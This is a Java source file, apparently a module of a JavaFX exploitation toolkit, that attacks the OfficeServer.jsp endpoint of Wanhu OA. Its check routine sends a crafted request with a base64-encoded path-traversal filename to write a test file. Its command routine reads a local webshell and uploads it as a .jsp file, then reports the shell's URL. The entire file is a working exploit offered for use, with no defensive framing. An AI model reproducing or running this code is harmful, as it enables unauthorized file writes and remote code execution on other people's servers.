package exp.oa.wanhuoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.*;

import java.util.Date;
import java.util.HashMap;

public class wanhu_OfficeServer_upload implements Exploitlnterface {

    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea) {

        try {
            long t = (new Date()).getTime();
            String filename = Base64Utils.base64Encode("../../public/edit/" + t + ".txt");
            String post = "DBSTEP V3.0     170              0                1000              DBSTEP=REJTVEVQ\r\n" +
                    "OPTION=U0FWRUZJTEU=\r\n" +
                    "RECORDID=\r\n" +
                    "isDoc=dHJ1ZQ==\r\n" +
                    "moduleType=Z292ZG9jdW1lbnQ=\r\n" +
                    "FILETYPE=" + filename + "\r\n" +
                    "111111111111111111222222222222222222222\r\n" +
                    "Hello R4gTest";

            HttpTools.post(url + "/defaultroot/public/iWebOfficeSign/OfficeServer.jsp", post, new HashMap<String, String>(), "utf-8");

            Response response1 = HttpTools.get(url + "/defaultroot/public/edit/" + t + ".txt", new HashMap<String, String>(), "utf-8");
            if (response1.getCode() == 200 && response1.getText().contains("Hello")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ wanhu_OfficeServer_upload ]");

                    textArea.appendText("\n 文件上传成功: " + url + "/defaultroot/public/edit/" + t + ".txt" + " \n 访问成功: " + response1.getText());

                    textArea.appendText("\n 请进行UPLOAD上传文件并ATT执行(*CMD栏为空)");
                    textArea.appendText("\n");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }
        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("连接异常!\n");
            });
            return false;
        }
    }

    private Boolean attcmd(String url, String pass, TextArea textArea, TextArea textArea_cmd) {
        try {
            long tt = (new Date()).getTime();
            String filename = Base64Utils.base64Encode("../../public/edit/" + tt + ".jsp");
            String shell_payload = Methods.readFile(pass);
            String payload = tt+"\n" + shell_payload;
            String post = "DBSTEP V3.0     170              0                5000              DBSTEP=REJTVEVQ\r\n" +
                    "OPTION=U0FWRUZJTEU=\r\n" +
                    "RECORDID=\r\n" +
                    "isDoc=dHJ1ZQ==\r\n" +
                    "moduleType=Z292ZG9jdW1lbnQ=\r\n" +
                    "FILETYPE="+filename+"\r\n" +
                    "111111111111111111111111111111111111111111111111\r\n" +
                    payload;

            HttpTools.post(url + "/defaultroot/public/iWebOfficeSign/OfficeServer.jsp", post, new HashMap<String, String>(), "utf-8");

            Response response1 = HttpTools.get(url + "/defaultroot/public/edit/"+tt+".jsp", new HashMap<String, String>(), "utf-8");
            if (response1.getCode() == 200 && response1.getText()!="") {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell上传成功: ----"+tt+"\n");
                    textArea.appendText(url + "/defaultroot/public/edit/"+tt+".jsp");
                });
                return true;

            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell文件上传失败");
                });
                return false;
            }
        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("连接异常\n");
            });
            return false;
        }
    }
}
